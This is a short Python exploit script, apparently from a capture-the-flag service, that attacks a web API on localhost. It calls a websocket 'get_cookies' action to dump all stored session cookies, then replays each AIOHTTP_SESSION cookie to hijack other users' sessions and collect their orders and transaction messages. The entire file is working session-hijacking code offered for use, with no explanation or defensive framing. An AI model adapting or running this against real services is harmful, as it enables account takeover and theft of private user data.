#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests, requests.cookies, json
from websocket import create_connection


url = 'ws://localhost:9090/api/ws'

ws = create_connection(url, timeout=5)
ws.recv()

data = json.dumps({'action': 'get_cookies', 'data': '*'})
ws.send(data)

response = json.loads(ws.recv())

jar = requests.cookies.RequestsCookieJar()

url_orders = 'http://localhost:9090/api/get_orders'
url_transactions = 'http://localhost:9090/api/get_transactions'
orders_set = set()
transactions_set = set()

for cookie in response['Response']['cookies']:
    one = requests.cookies.RequestsCookieJar()
    one.set('AIOHTTP_SESSION', cookie[16:])
    s = requests.Session()
    s.cookies = one

    response = s.get(url_orders).json()
    for order in response['orders']:
        orders_set.add(order['description'])

    response = s.get(url_transactions).json()
    for transaction in response['transactions']:
        transactions_set.add(transaction['msg'])

print(orders_set)
print(transactions_set)